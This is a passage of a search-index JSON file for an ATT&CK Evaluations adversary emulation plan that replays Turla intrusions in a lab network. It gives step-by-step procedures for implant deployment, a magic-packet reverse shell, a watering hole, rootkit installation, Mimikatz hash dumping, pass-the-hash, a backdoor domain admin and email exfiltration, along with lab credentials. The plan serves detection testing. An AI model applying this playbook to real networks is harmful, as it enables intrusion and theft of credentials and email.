Adalwolfa:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Keylogger","Current hostname discovery","Token manipulation and session discovery to restart in active session","Keylogging hook routine","Set keylogging hook","Active window discovery"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://blog.talosintelligence.com/2021/09/tinyturla.html","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"step-9---lateral-movement-to-linux-server","l":"Step 9 - Lateral Movement to Linux Server","p":["\uD83C\uDFA4 Voice Track:","Step 9 emulates Turla laterally moving to the Linux Apache server and installing Penquin.","First, the third CARBON-DLL implant downloads Penquin and pscp.exe to Adalwolfa's workstation, where pscp.exe is used with the credentials keylogged in the previous step to copy Penquin over to the Apache server. Next, CARBON-DLL downloads changes to the cron service to Adalwolfa's workstation and uses pscp.exe to also copy the changes to the Apache server.","Lastly, CARBON-DLL downloads plink.exe and, using the credentials keylogged in the previous step, executes Penquin on the Apache server.","Penquin performs the following actions:","Unpacking a binary (the compiled sniffer) named cron and adding executable permissions","Copying cron into /usr/bin/ as cron","Stopping the cron service","Creating a cron service file in the /etc/systemd/system/ folder for systemd to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in /etc/systemd/system/ are executed before files in the /usr/sbin/cron","Reloading and starting the cron service","Our cron service installs the sniffer and executes real cron as a child process","In summary, Penquin installs a BPF filter and listens on the Apache server's network interface for a specific activation packet."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your Kali C2 server terminal, task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).","Wait 1 minute and then task the implant to download pscp.exe","Wait 1 minute and then task the implant to copy Penquin to the Apache web server using Adalwolfa's credentials.","Wait 1 minute and then task the implant to download plink.exe","Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~ 8 seconds to execute).","Ensure no commands returned errors in the plink output:","Wait 1 minute and then task the implant to clean up downloaded files"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Penquin( Network Sniffer, Penquin Installer, & Obfuscation Algorithm)","Writes the sniffer (Penquin) to disk","Moves Penquin to /usr/bin","Creates a service file","Stops cron service","Executes Penquin as cron","Real cron starts as child process","Installs packet sniffer on eth0","Magic packet filter criteria","Execute reverse shell"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/the-penquin-turla-2/67962/","https://www.youtube.com/watch?v=JXsjRUxx47Et=647s","https://lab52.io/blog/looking-for-penquins-in-the-wild/"]},{"i":"step-10---installation-of-watering-hole","l":"Step 10 - Installation of Watering Hole","p":["\uD83C\uDFA4 Voice Track:","Step 10 emulates Turla sending a magic packet to the Apache server, on which the sniffer component of Penquin reads the magic packet, parses the packet for the IP address to connect to, and triggers the establishment of a reverse shell.","First, a few discovery commands are sent through the established reverse shell. Aditional HTML is then appended to the webpage previously edited by Adalwolfa, containing script tags that load another simple JavaScript file hosted by the adversary's malicious site, anto-int[.]com, that redirects users who browse to http://kagarov/index.html to the adversary's malicious site instead, thus completing the installation of the watering hole."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ From your Kali C2 server terminal, open a new terminal tab using Ctrl+Shift+T. Recommended: rename the new tab to Penquin NC","In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:","Right click and split the window horizontally. Run the following commands to send the magic packet to the Apache server using the sendPacket.py utility.","Wait a few seconds and then check the Netcat tab ( Penquin NC). The Netcat prompt should report a successful connection.","In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the watering hole redirection to index.html:","Note - this command does not return output. Wait 1 minute and then send the following command to close the reverse shell"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Penquin","sendPacket.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]}],[{"l":"Snake Scenario","p":["For ATT&CK Evaluations Enterprise Round 5, the Snake scenario was developed to emulate Turla's utilization of the following software:","Epic","Snake","PsExec","Mimikatz","LightNeuron"]},{"l":"Detections Scenario","p":["This 9 step scenario was created for the Detections portion of ATT&CK Evaluations Enterprise Round 5, where all prevention mechanisms and protection tooling is disabled to allow the full emulation plan to execute unobstructed. This allows the scenario to be executed from beginning to end, with each step building upon the previous. and for telemetry on red team activity to be gathered in full."]},{"l":"Protections Scenario","p":["The scenario created for the Detections portion was modularized into 6 discrete tests to create the Protections portion of ATT&CK Evaluations Enterprise Round 5, where prevention mechanisms and protection tooling is enabled. This highlights protection capabilities of the deployed solution and encourages blocks of red team activity as early as possible. For this reason, this version of the scenario was designed to removes the dependencies between each step."]},{"l":"Infrastructure","p":["This scenario was executed on the following infrastructure:","Snake Infrastructure Diagram","Reference setup for guidance on deploying the infrastructure used by this scenario."]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something"]},{"l":"Setup","p":["â¡ï¸ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Ensure the EPIC, Snake, and LightNeuron handlers started up."]},{"i":"step-11---initial-compromise-and-establish-foothold","l":"Step 11 - Initial Compromise and Establish Foothold","p":["\uD83C\uDFA4 Voice Track:","Step 11 emulates Turla gaining initial access via a watering hole attack targeting user Egle.","Egle visits a legitimate, but compromised website. This website redirects Egle to a duplicated, malicious version of the compromised website hosted on an adversary server containing javascript (JS) that fingerprints their machine in the background and installs an evercookie on their browser.","This malicious WordPress website prompts Egle with a notice to update their NotFlash. Egle clicks to download the update, NFVersion_5e.exe, containing EPIC (a.k.a. Tavdig/Wipbot).","The execution flow of EPIC follows the same execution flow of EPIC in the Carbon scenario. The only difference with this scenario's version of EPIC is it communicates over HTTPS instead.","Once C2 communications have been established between EPIC and the C2 via the proxy server, discovery is performed on the first host where information about the host device and domain computers is collected."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP to Azuolas (10.100.40.103) as Egle:","â¡ï¸ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","After redirection you will prompted to update NotFlash. Click to download the update ( NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot).","Close out of all tabs and sign out of your RDP session.","In your lower terminal tab, task the EPIC implant with the following set of discovery commands:","nk\\Egle","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Once the download has been completed, click the downloaded binary to execute it.","Open Microsoft Edge and browse to https://drebule.nk.local/owa. Log in as Egle:","Open Microsoft Edge and browse to nato-int.com.","Password","Producer1!","Re-RDP to Azuolas (10.100.40.103) as Egle:","Username","Wait 1 minute for it to finish running.","Wait for redirection to anto-int.com.","Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","Browser evercookie (utilized built-in BeEF Evercookie from the Browser Exploitation Framework)","Browser redirection","bzip2 compressed","C2 communications are over HTTPS, HTTPS specific flags","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Dropper","EPIC Guard","EPIC Injector","EPIC Payload(in msedge.exe)","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File write of EPIC injector","Fingerprinting details","Registry modification","RSA encrypted AES key","Targeting explorer.exe for DLL injection","Targeting svchost.exe for payload DLL injection","User discovery GetAllUsers","Watering Hole","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/","https://github.com/samyk/evercookie"]},{"i":"step-12---rootkit-installation","l":"Step 12 - Rootkit Installation","p":["\uD83C\uDFA4 Voice Track:","Step 12 emulates Turla exploiting a vulnerable driver to install the Snake rootkit on the Azuolas (10.100.40.103) system.","The existing EPIC implant, running under the context of Egle, will be used to download the Snake installer to the local machine and execute the installer as second stage malware. The Snake installer will escalate privileges to SYSTEM by exploiting a Windows 10 vulnerability. Once running as SYSTEM, the installer will disable DSE by loading and exploiting a vulnerable driver. Once DSE is disabled, the installer will load the Snake rootkit driver.","The rootkit driver will hook various functions and will inject a user-mode DLL into a SYSTEM process to execute received tasks from the C2 server. The driver will then wait for a browser process to make a network request to inject the user-mode DLL into the browser for C2 communications over HTTP. The injected DLLs will communicate between each other via named pipes.","At some point, Egle will browse to a website, triggering the rootkit driver to inject the user-mode DLL into the browser process - this DLL will begin communication with the C2 server over HTTP."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["In your Kali C2 server, ensure that you are in the lower split terminal window.","Task the EPIC implant to download the Snake rootkit installer.","Wait 1 minute after the payload is sucessfully downloaded before tasking the implant to execute the Snake rootkit installer with the privilege escalation option:","â¡ï¸ Switch to your RDP session in azuolas (10.100.40.103) and go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R.","â¡ï¸ Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","EPIC","Execute commands ExecCmd","File download DownloadFile","Function Hooking","Infinity Hook","Inject Usermodule DLL","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 9: Securelist/Artemon- Uroburos","Report 10: BAE/Artemon- Snake","Report 11: GData- Uroburos","Report 12: CIRCL- TR-25","Report 13: GData- Kernel Protection Mitigation","Report 14: GData- using WinDbg","Report 16: GData- Project Cobra","Report 17: Tetrane- Uroburos with REVEN","Report 18: Talos- Snake Campaign","Report 19: Lastline- Dissecting Turla Rootkit","Report 20: Lastline- Kernel Exploit Makeover","Report 27: GitHub- hfiref0x/TDL","Report 28: CoreLabs- VirtualBox Privilege Escalation","Report 29: Unit42- Acidbox"]},{"i":"step-13---first-workstation-discovery","l":"Step 13 - First Workstation Discovery","p":["\uD83C\uDFA4 Voice Track:","Step 13 emulates Turla performing discovery on the first workstation to discover a file server and associated file server admin.","The Snake rootkit receives tasking from the C2 server to enumerate currently running processes on the local computer and finds that EgleAdmin also has processes running. Further enumeration of the EgleAdmin user shows that it is a member of the File Server Admins group. Snake then impersonates Egle to enumerate mapped drives on the local machine and discovers Egle's home drive is actively mapped to the file server."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that File Server Admins is listed as one of the groups that EgleAdmin is a member of.","â Verify that the enumerated processes output contains a process running under EgleAdmin","â Verify that the home drive is mapped to the file server host berzas( 10.100.30.204).","â¡ï¸ Return to your Kali C2 server.","â¡ï¸ Return to your RDP session to azuolas (10.100.40.103) as Egle.","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\EgleAdmin:","From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:","nk\\EgleAdmin","Open up a powershell terminal and run the following command:","Password","Producer1!","This should return output similar to the following:","Username","Wait 1 minute then execute the next discovery command to enumerate EgleAdmin's groups:","Wait 1 minute then execute the next discovery command to the drive mapped to the file server:","When prompted, type in the password for EgleAdmin:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Task download","Task execution with optional token impersonation","Token duplication"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"step-14---lateral-movement-to-file-server","l":"Step 14 - Lateral Movement to File Server","p":["\uD83C\uDFA4 Voice Track:","Step 14 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it.","Using the information discovered in the previous step, Snake impersonates the EgleAdmin account to run PsExec and execute another copy of the Snake rootkit installer on the file server. This new copy of the Snake installer will have the installed rootkit beacon back to the C2 server via a different redirector."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Tasking the implant to download PsExec.","Wait 1 minute and then run the following command to download the snake installer:","Wait 1 minute before running the following command to execute PsExec as EgleAdmin, which will run the Snake installer on the file server berzas (10.100.30.204):","â¡ï¸ Go back to your RDP session to Azuolas (10.100.40.103) as Egle.","Minimize the RDP window.","â¡ï¸ RDP into berzas( 10.100.30.204) as EgleAdmin:","Username","Password","nk\\EgleAdmin","Producer1!","Close any spurious windows","Open Edge and navigate to https://www.google.com. Perform a search on File server configuration best practices, but don't click on any results.","Minimize the RDP window, keeping processes running.","â¡ï¸ Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","Wait 1 minute before running the following command to remove files from Azuolas (10.100.40.103):"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Disable DSE and Load Rootkit","Driver","Drop DLL","Function Hooking","Generic process execution with optional token impersonation","Infinity Hook","Inject Usermodule DLL","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution via cmd","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"step-15---domain-discovery","l":"Step 15 - Domain Discovery","p":["\uD83C\uDFA4 Voice Track:","Step 15 emulates Turla using Powershell to perform Active Directory user, group, and computer discovery.","The Snake rootkit receives tasking from the C2 server to use Powershell's ActiveDirectory module to enumerate domain users, admin groups, and computers. Upon discovering Zilvinas's regular and domain admin accounts, Snake will enumerate further details on the accounts. Snake then discovers a workstation belonging to Zilvinas to use as a future lateral movement target."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your lower Kali C2 control server terminal window, task Snake to check if the ActiveDirectory PowerShell module is installed.","â Verify that you see output. If the implant returns empty output, please contact your lead.","Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word \"management\", as members of these groups will likely have elevated permissions on the network.","â Verify that Server Management is included in the results.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla on users to target next.","â Verify that ZilvinasAdmin shows up in the list of accounts.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Domain Admins domain group.","Wait 1 minute before tasking Snake to discover domain users. Ensure Zilvinas and ZilvinasAdmin appear in the output.","Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).","â Ensure that Zilvinas' Workstation appears in the Description field for uosis"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Task download","Powershell execution"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-16---preparation-for-lateral-movement-to-admin-workstation","l":"Step 16 - Preparation for Lateral Movement to Admin Workstation","p":["\uD83C\uDFA4 Voice Track:","Step 16 emulates Turla performing credential dumping on the file server with the goal of moving laterally to a workstation owned by a Domain Admin.","Snake downloads Mimikatz to the file server and extracts all NTLM hashes on the target. The command output is sent directly to the C2 server."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From the Kali C2 server lower terminal window, task Snake to download Mimikatz to the file server:","Wait 1 minute and then instruct Snake to download PsExec to the file server:","Wait 1 minute and then run the following command to download the snake installer:","Wait 1 minute and then instruct Snake to run Mimikatz to dump all NTLM hashes from LSASS.exe:","â Verify that the password Producer2! and NTLM hash f3fcd61f987a97da49ce5f650b4e6539 for ZilvinasAdmin appears at least once in the output.","This should return:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Payload download","Generic process execution","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-17---lateral-movement-to-admin-workstation-and-persistence","l":"Step 17 - Lateral Movement to Admin Workstation and Persistence","p":["\uD83C\uDFA4 Voice Track:","Step 17 emulates Turla performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account.","The retrieved NTLM hash discovered in the previous step is used in a pass-the-hash attack to move laterally to Zilvinas's workstation. PsExec is used via pass-the-hash to execute and install the Snake rootkit on the target workstation.","Once the admin workstation has been compromised, Snake is used to enumerate processes running on Zilvinas's workstation uosis, where it is discovered that ZilvinasAdmin has processes running which can be used for token impersonation. By impersonating ZilvinasAdmin, a new domain user Leshy is created and added to the Domain Admins domain group for persistence."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that we find processes running under ZilvinasAdmin","â¡ï¸ Return to the Kali C2 server","â¡ï¸ Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","â¡ï¸ Wait 2 minutes. Start a new RDP session to uosis( 10.100.40.102) as Zilvinas:","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\ZilvinasAdmin:","Click on the search bar and search for powershell. Right click powershell and then click \"Run as Administrator\".","From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under ZilvinasAdmin.","Instruct Snake to pass-the-hash using ZilvinasAdmin's NTLM hash to run PsExec and install Snake on the target workstation.","nk\\Zilvinas","nk\\ZilvinasAdmin","Open Edge and navigate to https://drebule.nk.local/owa. Log in as Zilvinas:","Password","Producer2!","Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.","This should return output similar to the following:","Username","Wait 1 minute and then task the implant to delete artifacts from the file server.","Wait 1 minute, then instruct Snake to add Leshy to the Domain Admins group.","Wait 1 minute, then instruct Snake to create a new domain user Leshy using an access token from one of the ZilvinasAdmin processes. Leshy will be used as a backdoor domain admin account for persistence on the domain.","When prompted, type in the username and password for ZilvinasAdmin:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","File Upload","Function Hooking","Infinity Hook","Inject Usermodule DLL","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution for generic process","Task execution via cmd with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-18---lateral-movement-to-exchange-server","l":"Step 18 - Lateral Movement to Exchange Server","p":["\uD83C\uDFA4 Voice Track:","Step 18 emulates Turla laterally moving to the Exchange server and installing the LightNeuron implant there.","Snake downloads LightNeuron and associated Powershell installation script and config files, transfers them to the Exchange server, and remotely executes the installation script using WMI to install LightNeuron on the Exchange server."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From the Kali C2 lower terminal window, task Snake to download LightNeuron:","Wait 1 minute and then task Snake to download the companion DLL for LightNeuron:","Wait 1 minute and then task Snake to download the Powershell installation script for LightNeuron.","Wait 1 minute and then task Snake to download the LightNeuron email rules file.","Wait 1 minute and then task Snake to download the LightNeuron config file.","Wait 1 minute and then task Snake to copy LightNeuron, the rules config file, and the Powershell installation script to the remote target drebule, using token impersonation to perform the copy as ZilvinasAdmin.","Wait 1 minute before copying the next file:","Wait 1 minute before copying the rules file:","Wait 1 minute before copying the last config file:","Wait 1 minute and then task Snake to install LightNeuron remotely using WMI and Powershell, using ZilvinasAdmin's token","â Verify that the WMIC output shows a ReturnValue of 0.","Wait 1 minute and then task Snake to check the installation log for any errors:","Expected output will start with messages regarding PS-Session, the bottom of the file should look like:","â If the output contains any errors, notify your lead.","Wait 1 minute and then task Snake to remove artifacts from uosis (10.100.40.102):"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Installation Script","LightNeuron","Masquerading legitimate file name","Snake Usermodule DLL","Task download","Task execution for generic process with optional token impersonation","Task execution via cmd with optional token impersonation","Payload download","Token duplication"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-19---discovery-and-email-collection","l":"Step 19 - Discovery and Email Collection","p":["\uD83C\uDFA4 Voice Track:","Step 19 emulates Turla sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic.","Emails with JPG attachments containing AES encrypted commands embedded using stegonagraphy are sent from the C2 server to the domain. LightNeuron's transport agent processes all emails via LightNeuron's companion DLL, which executes the embedded command and blocks delivery of the email from the C2 server.","LightNeuron automatically collects all emails with recipients matching nk.local in a log file ( C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml).","Eventually, LightNeuron is tasked to exfiltrate the email log, which is exfiltrated over the existing C2 channel."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â If no response is received after 5 minutes, check the postfix logs on the Kali server to make sure the email was intercepted and processed correctly by LightNeuron.","â¡ï¸ Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","â¡ï¸ Switch to your RDP window to Azuolas( 10.100.40.103) as Egle.","Create a new email:","From the Kali C2 lower terminal window, task LightNeuron to perform system network configuration discovery:","Go to your Edge browser window with the OWA page. Your windows should still be up from Step 6.","Go to your Edge browser window. You should still be logged into OWA from Step 2.","If there is a reject entry, that means the email, destined for a nonexistent user, was processed by the Exchange server, meaning that LightNeuron was either not successfully installed or is not working properly.","Reply to the email from Zilvinas.","Send the email","The email recipient should be the user egle@nk.local","The email subject should be SAP Integration Issue","The file contents will be logged by the control server.â Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:","The following text should be pasted in as the email body:","The following text should be pasted in as the email reply body:","You should see the email from Zilvinas@nk.local. Try reloading the page if needed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Analyze attachment for data from C2","Automated Collection","Check message against rule file","Check signature in image","Companion DLL","Data Staging/Automated Collection","Decode attachment data from base64","Decrypt data in image","Email Hiding Rules","Encode data in base64","Encrypt result of command in image","Execute commands: Cmd ID 3","Execute commands: Cmd ID 5","Extract task from image","Hide result of command in image","Remote Email Collection","Send message back to C2 server over email","Steganography","Transport Agent"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]}],[{"l":"Snake Protections Scenario","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something"]},{"l":"Protections Setup","p":["â¡ï¸ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Ensure the EPIC, Snake, and LightNeuron handlers started up.","Within your Kali control server terminal window, right click and select\"Split Terminal Horizontally\". Be careful not to terminate the control server.","In the new terminal window, change directory to the control server repo:"]},{"i":"test-8-watering-hole","l":"Test 8: Watering Hole","p":["\uD83C\uDFA4 Voice Track:","Test 8 emulates Turla's initial access attempt via a watering hole attack targeting user Egle, who downloads the EPIC dropper."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP to Azuolas (10.100.40.103) as Egle:","Username","Password","nk\\Egle","Producer1!","Open Microsoft Edge and browse to nato-int.com.","Wait for redirection to anto-int.com.","After redirection you will prompted to update NotFlash. Click to download the update ( NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot). â DO NOT EXECUTE THE FILE.","Open File Explorer and browse to Downloads"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Watering Hole","Browser redirection","Browser evercookie (utilized built-in BeEF Evercookie from the Browser Exploitation Framework)","Fingerprinting details"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/","https://github.com/samyk/evercookie"]},{"i":"test-9-execute-epic","l":"Test 9: Execute EPIC","p":["\uD83C\uDFA4 Voice Track:","Test 9 emulates execution of the EPIC installer to achieve initial access and perform some discovery via the EPIC implant."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ Return to your Kali C2 server","â¡ï¸ Return to your RDP session as Egle","â¡ï¸ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","Close out of all tabs and sign out of your RDP session.","Double click on the downloaded NFVersion_5e.exe to run it.","In your lower terminal tab, task the EPIC implant with the following set of discovery commands:","nk\\Egle","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Open a new terminal tab and name it smbclient. Copy the EPIC dropper executable to Windows host, Azuolas:","Open File Explorer > Downloads","Open Microsoft Edge and browse to https://drebule.nk.local/owa. Log in as Egle:","Password","Producer1!","Re-RDP to Azuolas (10.100.40.103) as Egle:","Username","Wait 1 minute for it to finish running.","Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","bzip2 compressed","C2 communications are over HTTPS, HTTPS specific flags","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Dropper","EPIC Guard","EPIC Injector","EPIC Payload(in msedge.exe)","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File write of EPIC injector","Registry modification","RSA encrypted AES key","Targeting explorer.exe for DLL injection","Targeting svchost.exe for payload DLL injection","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/"]},{"i":"test-10-install-snake-on-first-target","l":"Test 10: Install Snake on First Target","p":["\uD83C\uDFA4 Voice Track:","Test 10 emulates Turla exploiting a vulnerable driver to install the Snake rootkit on the Azuolas system and then performing discovery on Azuolas to discover a file server and associated file server admin."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that File Server Admins is listed as one of the groups that EgleAdmin is a member of.","â Verify that the enumerated processes output contains a process running under EgleAdmin","â Verify that the home drive is mapped to the file server host berzas (10.100.30.204).","â¡ï¸ Return to your Kali C2 server terminal window","â¡ï¸ Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","â¡ï¸ Return to your Kali C2 server terminal window.","â¡ï¸ Switch to your RDP session to azuolas as egle.","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\EgleAdmin:","From the egle(â NOT egleadmin) powershell terminal, run the following command to execute the Snake rootkit installer with the privilege escalation option:","From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:","From your smbclient Kali terminal tab, transfer the Snake installer to Azuolas.","nk\\EgleAdmin","Open a Powershell prompt and run the following command:","Open File Explorer and browse to Desktop","Password","Producer1!","This should return output similar to the following:","Username","Wait 1 minute then execute the 